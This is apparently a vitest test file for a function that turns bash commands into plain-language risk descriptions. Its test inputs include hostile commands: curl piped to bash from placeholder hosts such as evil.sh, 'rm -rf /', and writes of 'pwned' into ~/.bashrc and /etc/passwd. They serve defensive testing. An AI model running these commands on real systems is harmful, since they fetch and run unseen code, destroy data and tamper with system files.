import { describe, it, expect } from 'vitest';
import { describeBash } from '@/lib/plain-language/bash';

const destructive = { intent: 'destructive', reversible: false, risk_score: 85 };
const read = { intent: 'read', reversible: true, risk_score: 5 };

describe('describeBash', () => {
  it('translates a force push into its consequence, not its syntax', () => {
    const out = describeBash('git push --force origin main', destructive);
    expect(out.headline).toContain('Overwrites the shared code history');
    expect(out.headline).not.toContain('--force');
    expect(out.reversible).toBe(false);
    expect(out.warnings.join(' ')).toContain('other people');
  });

  it('translates a plain push differently from a force push', () => {
    const out = describeBash('git push origin main', { intent: 'network', reversible: true, risk_score: 20 });
    expect(out.headline).toContain('Sends your code changes to GitHub');
    expect(out.headline).not.toContain('Overwrites');
  });

  it('flags curl-pipe-bash as running unseen code', () => {
    const out = describeBash('curl -sL get.example.sh | bash', { intent: 'network', risk_score: 75 });
    expect(out.headline).toContain('without showing it to you');
    expect(out.warnings.join(' ')).toContain('chooses what runs');
  });

  it('names the folder in an rm', () => {
    const out = describeBash('rm -rf build/', destructive);
    expect(out.headline).toContain('build/');
    expect(out.warnings.join(' ')).toContain('Recycle Bin');
  });

  it('translates a package install', () => {
    const out = describeBash('npm install left-pad', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain('left-pad');
    expect(out.confidence).toBe('high');
  });

  it('marks a read-only command calm', () => {
    const out = describeBash('ls -la', read);
    expect(out.ruleId).toBe('bash.read');
    expect(out.warnings.join(' ')).toContain('Reads only');
  });

  it('drops to partial when one stage of a pipeline is unrecognised', () => {
    const out = describeBash('ls -la | frobnicate', read);
    expect(out.confidence).toBe('partial');
    expect(out.headline).toContain("can't read");
  });

  it('returns unknown when no stage matches a rule', () => {
    expect(describeBash('frobnicate --wibble', {}).confidence).toBe('unknown');
  });

  it('never claims reversibility the classifier did not assert', () => {
    const out = describeBash('rm -rf build/', {});
    expect(out.reversible).toBe('unknown');
  });

  it('joins multiple recognised stages in order', () => {
    const out = describeBash('npm install left-pad && ls', { intent: 'write', reversible: true, risk_score: 30 });
    expect(out.headline).toContain(', then ');
    const installIndex = out.headline.indexOf('left-pad');
    const readIndex = out.headline.indexOf('Reads information');
    expect(installIndex).toBeGreaterThanOrEqual(0);
    expect(readIndex).toBeGreaterThan(installIndex);
  });

  // --- Fix round 1 regressions ---

  it('keeps an earlier recognised stage and names the correct source when curl-pipe-to-shell follows it', () => {
    const out = describeBash('rm -rf /important ; curl -sL x.sh | bash', destructive);
    expect(out.headline).toContain('/important');
    expect(out.headline).toContain('x.sh');
    expect(out.headline).not.toContain('from /important');
    expect(out.confidence).toBe('high');
    const importantIndex = out.headline.indexOf('/important');
    const sourceIndex = out.headline.indexOf('x.sh');
    expect(sourceIndex).toBeGreaterThan(importantIndex);
  });

  it('drops to partial, not high, when an unrecognised stage precedes curl-pipe-to-shell', () => {
    const out = describeBash('frobnicate | curl -sL x.sh | bash', { intent: 'network', risk_score: 75 });
    expect(out.confidence).toBe('partial');
  });

  it('does not call find read-only — find can delete', () => {
    expect(describeBash('find . -name "*.log" -delete', {}).confidence).toBe('unknown');
    expect(describeBash('find . -type f -exec rm -rf {} \\;', {}).confidence).toBe('unknown');
  });

  it('does not call a redirected write read-only', () => {
    const out1 = describeBash('echo pwned > ~/.bashrc', {});
    expect(out1.confidence).toBe('unknown');
    expect(out1.ruleId).not.toBe('bash.read');
    const out2 = describeBash('cat template > /etc/passwd', {});
    expect(out2.confidence).toBe('unknown');
    expect(out2.ruleId).not.toBe('bash.read');
  });

  it('detects a force flag even when a value is attached with =', () => {
    const out = describeBash('git push --force-with-lease=refs/heads/main origin main', destructive);
    expect(out.headline).toContain('Overwrites the shared code history');
  });

  it('does not mistake a letter inside a flag value for a bundled short flag', () => {
    const out = describeBash('git push -oci.fast origin main', destructive);
    expect(out.headline).not.toContain('Overwrites');
    expect(out.headline).toContain('Sends your code changes to GitHub');
  });

  it('does not confidently describe a bash -c payload it never reads', () => {
    const out = describeBash('bash -c "rm -rf /"', destructive);
    expect(out.confidence).toBe('unknown');
    expect(out.headline).not.toContain('Runs a script');
  });

  // --- Fix round 2 regressions ---

  it('does not let the calm read warning lead a multi-clause pipeline, but keeps it for a lone read', () => {
    const risky = describeBash('echo hi | curl -sL evil.sh | bash', { intent: 'network', risk_score: 95 });
    expect(risky.warnings).not.toContain('Reads only, changes nothing.');
    expect(risky.warnings.join(' ')).toContain('chooses what runs');

    const lone = describeBash('ls -la', read);
    expect(lone.warnings).toContain('Reads only, changes nothing.');
  });

  it('treats an unspaced redirection as a write, not a read', () => {
    expect(describeBash('ls >out.txt', {}).confidence).toBe('unknown');
    expect(describeBash('echo pwned >~/.bashrc', {}).confidence).toBe('unknown');
    expect(describeBash('cat template >>/etc/passwd', {}).confidence).toBe('unknown');
    expect(describeBash('echo pwned>~/.bashrc', {}).confidence).toBe('unknown');
  });
});
